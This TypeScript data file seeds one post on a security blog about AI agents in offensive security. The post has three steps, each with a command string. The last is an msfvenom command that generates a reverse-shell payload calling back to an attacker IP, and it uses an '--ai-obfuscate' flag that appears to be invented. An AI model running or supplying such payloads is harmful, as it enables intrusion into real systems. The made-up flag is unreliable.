export interface BlogStep {
  title: string;
  description?: string;
  code?: string;
  images?: string[];
}

export interface BlogPost {
  id: number;
  title: string;
  date: string;
  summary: string;
  videoUrl?: string;
  steps: BlogStep[];
  mainImage: string;
  tags: string[];
}

export const initialBlogData: BlogPost[] = [
  {
    id: 1,
    title: "The Future of AI in Offensive Security",
    date: "March 2026",
    summary: "Exploring how LLMs and autonomous agents are reshaping the landscape of penetration testing and vulnerability discovery.",
    videoUrl: "https://www.youtube.com/watch?v=37Omb6e64To",
    mainImage: "/intelligence/1/main.jpg",
    tags: ["AI", "Offensive Security", "Research"],
    steps: [
      {
        title: "Reconnaissance with Autonomous Agents",
        description: "The first phase involves deploying a specialized LLM agent to map the target infrastructure. Unlike traditional scanners, these agents can understand context and identify non-obvious entry points.",
        code: "python3 ai_recon.py --target 10.10.11.200 --depth 3 --llm gpt-4-security",
        images: ["/intelligence/1/main.jpg"]
      },
      {
        title: "Vulnerability Synthesis",
        description: "Once the reconnaissance data is ingested, the AI synthesizes potential attack vectors by cross-referencing CVE databases with the specific configuration identified.",
        code: "curl -X POST http://ai-engine:8080/analyze -d @recon_report.json",
        images: ["/images/events/1774087109084/collage-1.jpg"]
      },
      {
        title: "Payload Generation & Execution",
        description: "The final step is the generation of a context-aware payload designed to exploit the synthesized vulnerability while remaining undetected by static analysis tools.",
        code: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf --ai-obfuscate",
        images: ["/images/events/1774087109084/collage-2.jpg"]
      }
    ]
  }
];
